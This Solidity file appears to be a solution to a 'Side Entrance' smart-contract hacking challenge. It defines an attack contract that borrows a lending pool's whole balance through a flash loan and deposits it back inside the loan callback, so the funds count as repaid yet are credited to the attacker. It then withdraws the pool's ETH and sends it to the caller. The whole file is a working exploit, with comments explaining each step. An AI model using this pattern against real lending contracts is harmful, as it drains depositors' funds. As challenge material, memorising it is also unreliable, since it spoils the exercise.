// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttack {
    using Address for address payable;

    IPool immutable public pool;
    constructor(IPool _pool) {
        pool = _pool;
    }

    function execute() external payable {
        // Increase this contract address's balance in the lender pool and pay back flashloan. Pool contract can block
        // this exploit by adding reentrancy guard to external methods.
        IPool(msg.sender).deposit{value: msg.value}();
    }

    function drainFunds() external {
        uint256 poolBalance = address(pool).balance;

        // Execute a flash loan for pool's entire balance. `flashLoan` will call back into this contract's
        // `execute()` method which will increase this contract's balance in the pool via deposit().
        pool.flashLoan(poolBalance);

        // Now withdraw the pool's balance that was set in `execute()` which called `Pool.deposit()`.
        pool.withdraw();

        // Send funds to caller.
        payable(msg.sender).sendValue(poolBalance);
    }

    // Neccessary to receive ETH back from withdraw() call
    receive () external payable {}
 
}
